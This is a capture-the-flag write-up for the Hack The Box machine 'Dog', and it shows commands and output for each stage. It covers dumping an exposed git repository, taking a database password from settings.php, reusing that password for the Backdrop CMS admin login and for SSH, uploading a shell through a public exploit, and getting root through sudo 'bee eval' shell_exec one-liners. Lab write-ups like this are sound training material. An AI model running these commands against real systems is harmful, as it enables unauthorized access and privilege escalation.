## Intro

Tags: #linux #OSCPpath #WebApp #git #FileUpload #known-binary #easy 

-------
# Reconnaissance
## Port scan

```shell
sudo nmap -sC -sV -A -T4 -Pn dog.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 08:38 IST
Nmap scan report for 10.129.20.187
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.20.187:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
interesting `git` found

## WebApp

![](HTB_machines/MediaFiles/Pasted%20image%2020261002184057.png)

### Directories

```shell
dirsearch -u http://dog.htb/ -x 403,400,404 -o dir.fuzz
```

```shell
  
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: dir.fuzz

Target: http://dog.htb/

[19:54:22] Starting: 
[19:54:33] 200 -   95B  - /.git/COMMIT_EDITMSG
[19:54:33] 200 -  405B  - /.git/branches/
[19:54:33] 200 -  601B  - /.git/
[19:54:33] 200 -   73B  - /.git/description
[19:54:33] 200 -   92B  - /.git/config
[19:54:33] 200 -   23B  - /.git/HEAD
[19:54:33] 200 -  648B  - /.git/hooks/
[19:54:33] 200 -  453B  - /.git/info/
[19:54:33] 200 -  240B  - /.git/info/exclude
[19:54:33] 200 -  473B  - /.git/logs/
[19:54:33] 200 -  230B  - /.git/logs/HEAD
[19:54:33] 301 -  311B  - /.git/logs/refs  ->  http://dog.htb/.git/logs/refs/
[19:54:33] 301 -  317B  - /.git/logs/refs/heads  ->  http://dog.htb/.git/logs/refs/heads/
[19:54:33] 200 -  230B  - /.git/logs/refs/heads/master
[19:54:33] 200 -  456B  - /.git/refs/
[19:54:33] 200 -   41B  - /.git/refs/heads/master
[19:54:33] 301 -  312B  - /.git/refs/heads  ->  http://dog.htb/.git/refs/heads/
[19:54:33] 301 -  301B  - /.git  ->  http://dog.htb/.git/
[19:54:33] 301 -  311B  - /.git/refs/tags  ->  http://dog.htb/.git/refs/tags/
[19:54:33] 200 -    2KB - /.git/objects/
[19:54:34] 200 -  337KB - /.git/index
[19:55:44] 301 -  301B  - /core  ->  http://dog.htb/core/
[19:55:57] 200 -  584B  - /files/
[19:55:57] 301 -  302B  - /files  ->  http://dog.htb/files/
[19:56:08] 200 -    4KB - /index.php
[19:56:12] 200 -  453B  - /layouts/
[19:56:13] 200 -    7KB - /LICENSE.txt
[19:56:23] 301 -  304B  - /modules  ->  http://dog.htb/modules/
[19:56:23] 200 -  400B  - /modules/
[19:56:41] 200 -    5KB - /README.md
[19:56:44] 200 -  528B  - /robots.txt
[19:56:47] 200 -    0B  - /settings.php
[19:56:50] 301 -  302B  - /sites  ->  http://dog.htb/sites/
[19:57:00] 200 -  451B  - /themes/
[19:57:00] 301 -  303B  - /themes  ->  http://dog.htb/themes/

Task Completed
```
found `.git` 

#### Git enumeration

```shell
git clone https://github.com/arthaud/git-dumper.git
```

```shell
└─$ ./gitdumper.sh http://10.10.11.58/.git/ extracted_repo  
###########  
# GitDumper is part of https://github.com/internetwache/GitTools  
#  
# Developed and maintained by @gehaxelt from @internetwache  
#  
# Use at your own risk. Usage might be illegal in certain circumstances.  
# Only for educational purposes!  
###########  
  
  
[*] Destination folder does not exist  
[+] Creating extracted_repo/.git/  
[+] Downloaded: HEAD  
[-] Downloaded: objects/info/packs  
[+] Downloaded: description  
[+] Downloaded: config  
[+] Downloaded: COMMIT_EDITMSG  
[+] Downloaded: index  
[-] Downloaded: packed-refs  
[+] Downloaded: refs/heads/master  
[-] Downloaded: refs/remotes/origin/HEAD  
[-] Downloaded: refs/stash  
[+] Downloaded: logs/HEAD  
[+] Downloaded: logs/refs/heads/master  
[-] Downloaded: logs/refs/remotes/origin/HEAD  
[-] Downloaded: info/refs  
[+] Downloaded: info/exclude  
[-] Downloaded: /refs/wip/index/refs/heads/master  
[-] Downloaded: /refs/wip/wtree/refs/heads/master  
[+] Downloaded: objects/82/04779c764abd4c9d8d95038b6d22b6a7515afa  
[-] Downloaded: objects/00/00000000000000000000000000000000000000  
[+] Downloaded: objects/92/62bdafa2521035e3128f0956c48d279d389ea2  
[+] Downloaded: objects/d1/59169d1050894d3ea3b98e1c965c4058208fe1  
[+] Downloaded: objects/d9/3d66b3bdc7ffa2dbf42b1fcfe20f62df15cec0  
[+] Downloaded: objects/d6/dda33ea64287ab76f6a9b4404e9e04dbf67b7b  
[+] Downloaded: objects/c9/9fe269d56a8d1e08bd389e7a032ef2f7905cad  
[+] Downloaded: objects/0e/3f55a9f2854d40d5ddc4aca36ae21f6ea489f0  
[+] Downloaded: objects/f8/3230fa2cf180e5b75334dd677e1b5d4d31123b  
[+] Downloaded: objects/27/1227dab979723b23bc53f3125966f4382a7803  
[+] Downloaded: objects/51/44053b7a821d02460db2e902007a20004dfa16  
[+] Downloaded: objects/d7/9f5db75c47c00c9a73ec324145218410e17f00  
[+] Downloaded: objects/5f/2f486f1a71b32f07a060e1e731cfe02e047ed0  
[+] Downloaded: objects/e5/7d5ee706906f1338f3f9471545b9d64d95b1d7  
[+] Downloaded: objects/b4/79e353d20c0790a09d870de7065cd56d5c3912  
[+] Downloaded: objects/25/b58c3ec85f491c2ecf6c71e42f0013f2952c6d  
[+] Downloaded: objects/6f/b431954b953652923b5fa2ef34ed1a9912ccdc  
[+] Downloaded: objects/95/8808ae345f60fc9347ac9d4545445e5cfdb075  
[+] Downloaded: objects/34/0ad8c62aed3b0d872f9df815dcba35a98f3cb8  
[+] Downloaded: objects/12/cb45ac9837cf3e3c2602acdc954e1b69dedae8  
[+] Downloaded: objects/ce/71c9c586dd0f608ec0aef8be44a59ee663293f  
[+] Downloaded: objects/1c/3c8947a55f78fc760e480e599d0a380f07a0c8
```

```shell
└─$ ls  
core/ files/ index.php* layouts/ LICENSE.txt* README.md*  
robots.txt* settings.php* sites/ themes/
```
`settings.php` contains creds!
```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```
#### creds obtained

```
root, dogBackDropSystem, anonymous
BackDropJ2024DS2024
```

## Admin panel login

the above users did not work, then searched git again for user emails
```shell
grep -R "@dog.htb" *
```
found `tiffany@dog.htb`! lets try the password with this one

logged in with `tiffany@dog.htb:BackDropJ2024DS2024`
![](MediaFiles/Pasted%20image%2020261002184724.png)
### File upload found
![](MediaFiles/Pasted%20image%2020261002185924.png)

-----
# Foothold

### Vulnerable webapp version

Found Backdrop CMS `1.27.1` on git
```shell
grep -R "version ="
```

```shell
searchsploit -m php/webapps/52021.py
python3 52021.py http://dog.htb
```

pass zip restriction, since server blocked zip uploads
```shell
tar -cvf shell.tar shell/  
```
now Upload shell.tar via CMS and trigger execution to gain a reverse shell.
![](MediaFiles/Pasted%20image%2020261002185941.png)

### Shell as www-data

#### User enumeration
```shell
cat /etc/passwd | grep bash
```
these are the users we can login towards
```shell
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

## Shell as johncusack via pass reuse

with this password `BackDropJ2024DS2024`
```shell
ssh johncusack@dog.htb
```
grabbed user flag!

-----
# Privesc

## sudo -l

```shell
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

### Known binary

https://gtfobins.org/gtfobins/bee/
go to `Backdrop CMS root directory`
```shell
cd /var/www/html/
```
next get root shell
```shell
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('/bin/sh');"
```
or
```shell
sudo bee eval 'system("bash")'
```
or u could just place a rev shell there

## Shell as root

grabbed root flag!
```shell
root@dog:~# id
uid=0(root) gid=0(root) groups=0(root)
root@dog:~# cat /root/root.txt
```

-------
